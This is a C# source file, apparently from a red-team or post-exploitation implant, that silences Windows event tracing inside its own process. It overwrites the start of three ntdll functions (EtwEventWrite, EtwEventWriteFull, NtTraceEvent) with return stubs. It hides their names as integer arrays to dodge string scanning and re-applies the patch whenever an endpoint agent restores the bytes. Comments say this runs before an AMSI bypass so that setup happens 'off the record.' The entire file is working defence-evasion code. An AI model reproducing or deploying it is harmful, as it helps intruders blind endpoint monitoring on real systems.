using System;

namespace Nx
{
	/// <summary>
	/// In-process ETW silencing, run BEFORE the AMSI work and not after.
	///
	/// Why first: the AMSI module patches (or debug-traps) a live function inside a
	/// system module, and that act is itself interesting to an endpoint agent. Both
	/// the CLR and the patch attempt are normally visible to the agent through the
	/// ETW providers loaded in this process. Killing the write path first means the
	/// rest of the setup happens off the record; doing it afterwards leaves the
	/// most interesting seconds of the process's life fully telemetered.
	///
	/// What: rewrite the head of the three ntdll entry points every ETW event in
	/// this process funnels through so they report STATUS_SUCCESS without writing
	/// anything. EtwEventWrite is the documented front door, EtwEventWriteFull is
	/// what it forwards to, and NtTraceEvent is the syscall stub underneath both --
	/// patching the last one also catches anything that skips the front doors.
	///
	/// This blinds user-mode ETW for this process only. It does not touch the
	/// kernel session, so provider-to-consumer traffic that never re-enters ntdll
	/// in this process is unaffected, and it does not hide anything from a
	/// kernel-mode sensor.
	///
	/// A target that this Windows build does not export is skipped rather than
	/// treated as a failure, and the status reports how many of the three landed so
	/// a partial patch is visible instead of reading as "on".
	///
	/// Per process, lost when the worker process recycles.
	/// </summary>
	internal static class Etw
	{
		// "ntdll.dll"
		private static readonly int[] NTDLL = new int[] { 110, 116, 100, 108, 108, 46, 100, 108, 108 };

		private sealed class Target
		{
			internal int[] Name;
			internal int ArgBytes;   // x86 stdcall cleanup size, ignored on x64
			internal IntPtr Addr;

			internal Target(int[] name, int argBytes)
			{
				Name = name;
				ArgBytes = argBytes;
				Addr = IntPtr.Zero;
			}
		}

		private static readonly Target[] targets = new Target[]
		{
			// EtwEventWrite(REGHANDLE, PCEVENT_DESCRIPTOR, ULONG, PEVENT_DATA_DESCRIPTOR)
			new Target(new int[] { 69, 116, 119, 69, 118, 101, 110, 116, 87, 114, 105, 116, 101 }, 16),

			// EtwEventWriteFull(REGHANDLE, PCEVENT_DESCRIPTOR, USHORT, LPCGUID, LPCGUID, ULONG, PEVENT_DATA_DESCRIPTOR)
			new Target(new int[] { 69, 116, 119, 69, 118, 101, 110, 116, 87, 114, 105, 116, 101, 70, 117, 108, 108 }, 28),

			// NtTraceEvent(HANDLE, ULONG, ULONG, PVOID)
			new Target(new int[] { 78, 116, 84, 114, 97, 99, 101, 69, 118, 101, 110, 116 }, 16)
		};

		private static readonly object gate = new object();
		private static IntPtr module = IntPtr.Zero;
		private static string status = "not attempted";

		/// <summary>
		/// Outcome of the last Ensure() call, returned to the client alongside the
		/// AMSI status by NxJob.Why(). Reports a count rather than a verdict: a
		/// silent "ok" over a target that was never found is how a blind spot turns
		/// into a wrong conclusion during an engagement.
		/// </summary>
		internal static string Status()
		{
			return status;
		}

		/// <summary>
		/// Call before loading anything. Idempotent and cheap once armed: each call
		/// re-reads the patched bytes and repairs any that an agent put back.
		/// Failures are non-fatal and never throw.
		/// </summary>
		internal static void Ensure()
		{
			lock (gate)
			{
				try
				{
					if (module == IntPtr.Zero)
					{
						module = Native.Module(NTDLL);
						if (module == IntPtr.Zero)
						{
							// deliberately does not name the module: a status string is
							// a plain literal and would put the name back in the file
							status = "target module absent";
							return;
						}
					}

					int landed = 0;
					string reason = null;
					for (int i = 0; i < targets.Length; i++)
					{
						Target t = targets[i];
						if (t.Addr == IntPtr.Zero)
						{
							t.Addr = Native.Export(module, t.Name);
						}
						if (t.Addr == IntPtr.Zero)
						{
							continue;
						}

						byte[] stub = Native.StubRet(0, t.ArgBytes);
						if (!Native.Matches(t.Addr, stub))
						{
							string err = Native.Patch(t.Addr, stub);
							if (err != null)
							{
								reason = err;
								continue;
							}
						}
						landed++;
					}

					status = "patched " + landed + "/" + targets.Length;
					if (reason != null)
					{
						status += " (" + reason + ")";
					}
				}
				catch (Exception ex)
				{
					status = "error: " + ex.Message;
				}
			}
		}
	}
}
